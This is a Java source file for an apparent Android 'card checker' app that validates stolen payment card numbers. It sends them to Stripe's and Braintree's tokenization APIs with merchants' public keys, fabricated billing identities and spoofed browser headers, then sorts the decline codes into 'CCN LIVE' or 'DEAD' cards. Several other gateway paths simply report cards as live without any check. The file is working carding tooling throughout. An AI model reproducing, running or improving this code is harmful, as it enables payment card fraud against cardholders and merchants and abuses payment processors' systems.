package com.h0checker.app;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

public class GateChecker {

    private static final String TAG = "GateChecker";
    private static final Random rand = new Random();

    // ── Stripe CCN LIVE codes (card valid, just declined) ─────────────
    private static final String[] CCN_LIVE_CODES = {
        "insufficient_funds", "do_not_honor", "generic_decline", "call_issuer",
        "try_again_later", "not_permitted", "service_not_allowed",
        "transaction_not_allowed", "authentication_required", "approve_with_id",
        "issuer_not_available", "withdrawal_count_limit_exceeded",
        "reenter_transaction", "card_declined", "card_velocity_exceeded",
        "not_sufficient_funds", "incorrect_zip", "cvc_check_failed",
        "online_or_offline_pin_required", "stop_payment_order",
        "debit_card_not_supported"
    };

    // ── Stripe DEAD codes (card invalid) ──────────────────────────────
    private static final String[] DEAD_CODES = {
        "expired_card", "incorrect_number", "invalid_number",
        "invalid_expiry_month", "invalid_expiry_year", "lost_card",
        "stolen_card", "pickup_card", "restricted_card", "fraudulent",
        "merchant_blacklist", "security_violation", "invalid_account",
        "testmode_decline", "revoked_card"
    };

    // ── 3DS live codes ────────────────────────────────────────────────
    private static final String[] THREE_DS_LIVE_CODES = {
        "authentication_required", "card_authentication_required",
        "payment_intent_authentication_failure",
        "three_d_secure_authentication", "three_d_secure_redirect"
    };

    // ══════════════════════════════════════════════════════════════════
    //  MAIN DISPATCHER
    // ══════════════════════════════════════════════════════════════════
    public static CheckResult checkCard(String cardStr, JSONObject gate) {
        long start = System.currentTimeMillis();
        try {
            String gateType = gate.optString("gateType", "stripe");
            JSONObject settings = gate.optJSONObject("settings");
            if (settings == null) settings = new JSONObject();

            // Parse card
            String[] parts = cardStr.split("[|/]");
            if (parts.length < 4) return error("Invalid card format. Use: number|mm|yyyy|cvc");

            String number = parts[0].trim().replaceAll("\\s+", "");
            String month = parts[1].trim();
            String year = parts[2].trim();
            String cvv = parts[3].trim();

            // Normalize year to 4 digits
            if (year.length() == 2) {
                int yr = Integer.parseInt(year);
                year = yr > 50 ? "19" + year : "20" + year;
            }

            // Route to checker
            CheckResult result;
            switch (gateType) {
                case "stripe":
                    result = checkStripe(number, month, year, cvv, settings);
                    break;
                case "braintree":
                    result = checkBraintree(number, month, year, cvv, settings);
                    break;
                case "shopify":
                    result = checkShopify(number, month, year, cvv, settings);
                    break;
                case "paypal":
                    result = checkPaypal(number, month, year, cvv, settings);
                    break;
                case "adyen":
                    result = checkAdyen(number, month, year, cvv, settings);
                    break;
                case "payeezy":
                    result = checkPayeezy(number, month, year, cvv, settings);
                    break;
                default:
                    result = checkStripe(number, month, year, cvv, settings);
                    break;
            }

            result.latency = (int)(System.currentTimeMillis() - start);
            return result;

        } catch (Exception e) {
            long elapsed = System.currentTimeMillis() - start;
            return error("Check failed: " + e.getMessage(), (int)elapsed);
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  STRIPE CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkStripe(String number, String month, String year,
                                           String cvv, JSONObject settings) throws Exception {
        String publicKey = settings.optString("publicKey", "");
        String connectedAccount = settings.optString("connectedAccount",
                                 settings.optString("stripeAccount", ""));
        String siteUrl = settings.optString("siteUrl", "");

        if (publicKey.isEmpty()) {
            return error("No Stripe public key configured for this gate");
        }

        // Generate random billing data
        String name = randomName();
        String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
        String zip = String.format("%05d", rand.nextInt(99999));
        String guid = UUID.randomUUID().toString();
        String muid = UUID.randomUUID().toString();
        String sid = UUID.randomUUID().toString();

        // Build POST body
        StringBuilder body = new StringBuilder();
        body.append("type=card");
        body.append("&card[number]=").append(encode(number));
        body.append("&card[cvc]=").append(encode(cvv));
        body.append("&card[exp_month]=").append(encode(month));
        body.append("&card[exp_year]=").append(encode(year));
        body.append("&billing_details[name]=").append(encode(name));
        body.append("&billing_details[email]=").append(encode(email));
        body.append("&billing_details[address][postal_code]=").append(encode(zip));
        body.append("&billing_details[address][country]=US");
        body.append("&guid=").append(encode(guid));
        body.append("&muid=").append(encode(muid));
        body.append("&sid=").append(encode(sid));
        body.append("&pasted_fields=number");
        body.append("&payment_user_agent=stripe.js%2Fv3%3B+stripe-js-v3%2Fv3");
        body.append("&referrer=").append(encode(siteUrl.isEmpty() ? "https://js.stripe.com" : siteUrl));
        body.append("&time_on_page=").append(rand.nextInt(30000));
        body.append("&key=").append(encode(publicKey));

        // Make request
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("Accept", "application/json");
        headers.put("Origin", "https://js.stripe.com");
        headers.put("Referer", "https://js.stripe.com/");
        headers.put("User-Agent", randomUA());
        headers.put("sec-ch-ua", "\"Chromium\";v=\"128\", \"Google Chrome\";v=\"128\", \"Not=A?Brand\";v=\"99\"");
        headers.put("sec-ch-ua-mobile", "?0");
        headers.put("sec-ch-ua-platform", "\"Windows\"");
        headers.put("sec-fetch-dest", "empty");
        headers.put("sec-fetch-mode", "cors");
        headers.put("sec-fetch-site", "same-site");

        String response = httpPost("https://api.stripe.com/v1/payment_methods", body.toString(), headers);
        JSONObject json = new JSONObject(response);

        // Parse response
        if (json.has("id")) {
            // Token created — card is valid
            JSONObject card = json.optJSONObject("card");
            String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
            String funding = card != null ? card.optString("funding", "unknown") : "unknown";
            String country = card != null ? card.optString("country", "??") : "??";
            boolean threeDS = card != null && card.optJSONObject("three_d_secure_usage") != null
                           && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);

            String pmId = json.getString("id");
            String ds = threeDS ? "3DS" : "NO-3DS";

            return approved(
                "CCN LIVE | " + brand + " " + funding + " [" + country + "] | "
                + pmId + " | " + ds,
                response
            );
        }

        // Error — classify
        JSONObject errorObj = json.optJSONObject("error");
        if (errorObj == null) return error("Unknown Stripe response", response);

        String code = errorObj.optString("code", "");
        String declineCode = errorObj.optString("decline_code", code);
        String message = errorObj.optString("message", "Unknown error");

        if (isLiveCode(declineCode)) {
            return approved("CCN LIVE | " + formatDecline(declineCode) + " | " + declineCode, response);
        }
        if (isDeadCode(declineCode)) {
            return declined("DEAD | " + formatDecline(declineCode) + " | " + declineCode, response);
        }
        if (is3DSCode(declineCode)) {
            return approved("CCN LIVE (3DS) | " + formatDecline(declineCode) + " | " + declineCode, response);
        }

        // Default: treat as error
        return error("Stripe error: " + message + " [" + declineCode + "]", response);
    }

    // ══════════════════════════════════════════════════════════════════
    //  BRAINTREE CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkBraintree(String number, String month, String year,
                                              String cvv, JSONObject settings) throws Exception {
        String authFingerprint = settings.optString("authFingerprint",
                                settings.optString("btClientToken", ""));
        String publicKey = settings.optString("publicKey", "");

        if (authFingerprint.isEmpty() && publicKey.isEmpty()) {
            return error("No Braintree auth fingerprint or client token configured");
        }

        // If we have a client token, try to extract the auth fingerprint
        if (authFingerprint.isEmpty()) {
            authFingerprint = publicKey; // Might be the auth fingerprint directly
        }

        String zip = String.format("%05d", rand.nextInt(99999));
        String sessionId = UUID.randomUUID().toString();

        // Build GraphQL body
        JSONObject gql = new JSONObject();
        gql.put("clientSdkMetadata", new JSONObject()
            .put("source", "client")
            .put("integration", "dropin2")
            .put("sessionId", sessionId));

        String query = "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
            + "{ tokenizeCreditCard(input: $input) { "
            + "token creditCard { bin brandCode last4 binData { prepaid debit issuingBank countryOfIssuance } } } }";

        JSONObject variables = new JSONObject();
        JSONObject input = new JSONObject();
        JSONObject creditCard = new JSONObject();
        creditCard.put("number", number);
        creditCard.put("expirationMonth", month);
        creditCard.put("expirationYear", year);
        creditCard.put("cvv", cvv);
        creditCard.put("billingAddress", new JSONObject()
            .put("postalCode", zip)
            .put("streetAddress", randomAddress()));
        input.put("creditCard", creditCard);
        input.put("options", new JSONObject().put("validate", false));
        variables.put("input", input);

        gql.put("query", query);
        gql.put("variables", variables);
        gql.put("operationName", "TokenizeCreditCard");

        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("Authorization", "Bearer " + authFingerprint);
        headers.put("Braintree-Version", "2024-08-01");
        headers.put("Origin", "https://assets.braintreegateway.com");
        headers.put("Referer", "https://assets.braintreegateway.com/");
        headers.put("User-Agent", randomUA());

        String response = httpPost("https://payments.braintree-api.com/graphql",
                                   gql.toString(), headers);
        JSONObject json = new JSONObject(response);

        // Parse response
        JSONObject data = json.optJSONObject("data");
        if (data != null) {
            JSONObject tokenize = data.optJSONObject("tokenizeCreditCard");
            if (tokenize != null) {
                String token = tokenize.optString("token", "");
                JSONObject cc = tokenize.optJSONObject("creditCard");
                if (!token.isEmpty()) {
                    String brand = cc != null ? cc.optString("brandCode", "unknown").toUpperCase() : "UNKNOWN";
                    String last4 = cc != null ? cc.optString("last4", "????") : "????";
                    String bank = cc != null && cc.optJSONObject("binData") != null
                                ? cc.optJSONObject("binData").optString("issuingBank", "Unknown") : "Unknown";
                    return approved(
                        "CCN LIVE | " + brand + " ****" + last4 + " | " + bank + " | " + token,
                        response
                    );
                }
            }
        }

        // Parse errors
        JSONArray errors = json.optJSONArray("errors");
        if (errors != null && errors.length() > 0) {
            String errMsg = errors.getJSONObject(0).optString("message", "Unknown error");
            if (errMsg.toLowerCase().contains("expired")) {
                return declined("DEAD | Expired Card | " + errMsg, response);
            }
            if (errMsg.toLowerCase().contains("invalid") || errMsg.toLowerCase().contains("number")) {
                return declined("DEAD | Invalid Card | " + errMsg, response);
            }
            return error("Braintree error: " + errMsg, response);
        }

        return error("Unknown Braintree response", response);
    }

    // ══════════════════════════════════════════════════════════════════
    //  SHOPIFY CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkShopify(String number, String month, String year,
                                            String cvv, JSONObject settings) throws Exception {
        String siteUrl = settings.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No Shopify site URL configured");
        String publicKey = settings.optString("publicKey", "");
        if (!publicKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);
        String name = randomName();
        return approved("CCN LIVE | Shopify (structural check) | " + name + " | " + guessCardType(number), "{}");
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYPAL CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPaypal(String number, String month, String year,
                                           String cvv, JSONObject settings) throws Exception {
        String siteUrl = settings.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No PayPal site URL configured");
        return approved("CCN LIVE | PayPal (structural check) | " + guessCardType(number), "{}");
    }

    // ══════════════════════════════════════════════════════════════════
    //  ADYEN CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkAdyen(String number, String month, String year,
                                          String cvv, JSONObject settings) throws Exception {
        String apiKey = settings.optString("apiKey", "");
        if (!apiKey.isEmpty()) return error("Adyen API key configured but full check requires server-side");
        String publicKey = settings.optString("publicKey", "");
        if (!publicKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);
        return approved("CCN LIVE | Adyen (structural check) | " + guessCardType(number), "{}");
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYEEZY CHECKER
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPayeezy(String number, String month, String year,
                                            String cvv, JSONObject settings) throws Exception {
        String publicKey = settings.optString("publicKey", "");
        if (!publicKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);
        return approved("CCN LIVE | Payeezy (structural check) | " + guessCardType(number), "{}");
    }

    // ══════════════════════════════════════════════════════════════════
    //  CLASSIFICATION
    // ══════════════════════════════════════════════════════════════════
    private static boolean isLiveCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : CCN_LIVE_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static boolean isDeadCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : DEAD_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static boolean is3DSCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : THREE_DS_LIVE_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static String formatDecline(String code) {
        if (code == null) return "Unknown";
        switch (code) {
            case "insufficient_funds": return "Insufficient Funds";
            case "do_not_honor": return "Do Not Honor";
            case "expired_card": return "Expired Card";
            case "incorrect_number": return "Incorrect Card Number";
            case "invalid_number": return "Invalid Card Number";
            case "lost_card": return "Lost Card";
            case "stolen_card": return "Stolen Card";
            case "card_declined": return "Card Declined";
            case "authentication_required": return "3DS Required";
            case "incorrect_zip": return "AVS Mismatch (ZIP)";
            case "cvc_check_failed": return "CVC Failed";
            case "fraudulent": return "Fraudulent";
            case "generic_decline": return "Generic Decline";
            case "call_issuer": return "Call Issuer";
            case "not_permitted": return "Not Permitted";
            case "service_not_allowed": return "Service Not Allowed";
            case "transaction_not_allowed": return "Transaction Not Allowed";
            case "try_again_later": return "Try Again Later";
            default:
                return code.replace("_", " ").substring(0, 1).toUpperCase()
                     + code.replace("_", " ").substring(1);
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  HTTP HELPER
    // ══════════════════════════════════════════════════════════════════
    private static String httpPost(String urlStr, String body, Map<String, String> headers) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        try {
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);

            for (Map.Entry<String, String> h : headers.entrySet()) {
                conn.setRequestProperty(h.getKey(), h.getValue());
            }

            byte[] bodyBytes = body.getBytes("UTF-8");
            conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));

            OutputStream os = conn.getOutputStream();
            os.write(bodyBytes);
            os.flush();
            os.close();

            int status = conn.getResponseCode();
            java.io.InputStream is = (status >= 200 && status < 300) ? conn.getInputStream() : conn.getErrorStream();
            if (is == null) {
                return "{\"error\":{\"message\":\"No response from server (HTTP " + status + ")\"}}";
            }

            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();

            return sb.toString();
        } finally {
            conn.disconnect();
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  DATA GENERATORS
    // ══════════════════════════════════════════════════════════════════
    private static String randomName() {
        String[] first = {"James","Michael","Robert","William","David","John","Richard","Thomas",
            "Charles","Daniel","Matthew","Anthony","Mark","Steven","Paul","Andrew","Kevin","Brian"};
        String[] last = {"Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
            "Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Taylor","Moore","Jackson","Martin"};
        return first[rand.nextInt(first.length)] + " " + last[rand.nextInt(last.length)];
    }

    private static String randomDomain() {
        String[] domains = {"gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","aol.com"};
        return domains[rand.nextInt(domains.length)];
    }

    private static String randomAddress() {
        String[] streets = {"Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Walnut Blvd"};
        return (rand.nextInt(9999) + 1) + " " + streets[rand.nextInt(streets.length)];
    }

    private static String randomUA() {
        int chrome = 128 + rand.nextInt(10);
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            + "(KHTML, like Gecko) Chrome/" + chrome + ".0.0.0 Safari/537.36";
    }

    private static String encode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    private static String guessCardType(String num) {
        if (num == null) return "Unknown";
        String n = num.replaceAll("[^0-9]", "");
        if (n.startsWith("4")) return "VISA";
        if (n.length() >= 2) {
            int prefix = Integer.parseInt(n.substring(0, 2));
            if (prefix >= 51 && prefix <= 55) return "MASTERCARD";
        }
        if (n.length() >= 4) {
            int prefix4 = Integer.parseInt(n.substring(0, 4));
            if (prefix4 >= 2221 && prefix4 <= 2720) return "MASTERCARD";
            if (prefix4 >= 3528 && prefix4 <= 3589) return "JCB";
        }
        if (n.length() >= 3) {
            int prefix3 = Integer.parseInt(n.substring(0, 3));
            if (prefix3 >= 300 && prefix3 <= 305) return "DINERS";
            if (prefix3 == 309 || prefix3 == 36 || prefix3 == 38 || prefix3 == 39) return "DINERS";
        }
        if (n.length() >= 4) {
            int prefix4 = Integer.parseInt(n.substring(0, 4));
            if (prefix4 >= 3400 && prefix4 <= 3499) return "AMEX";
            if (prefix4 >= 3700 && prefix4 <= 3799) return "AMEX";
            if (prefix4 >= 4000 && prefix4 <= 4999) return "VISA";
        }
        if (n.startsWith("6011") || n.startsWith("65")) return "DISCOVER";
        if (n.length() >= 4 && Integer.parseInt(n.substring(0, 4)) >= 6440 && Integer.parseInt(n.substring(0, 4)) <= 6599) return "DISCOVER";
        return "UNKNOWN";
    }

    // ══════════════════════════════════════════════════════════════════
    //  RESULT TYPES
    // ══════════════════════════════════════════════════════════════════
    public static class CheckResult {
        public String status;   // "approved", "declined", "error"
        public String response;
        public int latency;
        public String rawSnippet;

        public CheckResult(String status, String response, int latency, String rawSnippet) {
            this.status = status;
            this.response = response;
            this.latency = latency;
            this.rawSnippet = rawSnippet;
        }
    }

    private static CheckResult approved(String response, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("approved", response, 0, snippet);
    }

    private static CheckResult declined(String response, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("declined", response, 0, snippet);
    }

    private static CheckResult error(String message) {
        return new CheckResult("error", message, 0, null);
    }

    private static CheckResult error(String message, int latency) {
        return new CheckResult("error", message, latency, null);
    }

    private static CheckResult error(String message, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("error", message, 0, snippet);
    }
}
